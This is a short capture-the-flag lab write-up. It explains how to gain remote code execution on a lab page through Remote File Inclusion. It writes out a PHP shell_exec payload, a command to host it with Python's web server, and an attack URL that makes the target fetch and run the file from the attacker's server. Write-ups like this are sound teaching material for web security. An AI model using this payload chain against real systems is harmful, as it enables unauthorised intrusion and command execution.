# Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
The web page simply shows a normal form to apply any techinique. In this challenge we have to execute a RFI (Remote File Inclusion).

To do that, we have to create a script file, host a web server and redirect to our URL page file to display the content of the server.

In this challenge, it only needs the hostname of the machine, so I created a file called "attackRFI.txt" including the following code.
```
echo <?php echo shell_exec("hostname");?>
```
Then hosted my web server.
```
$ python -m http.server
```
And executed the followed payload.

```
http://MACHINE_IP/playground.php?file=http://MY_WEB_SERVER_IP:8000/attackRFI.txt
```

Giving us the flag

![alt text]("Challenge 4 - RFI flag")
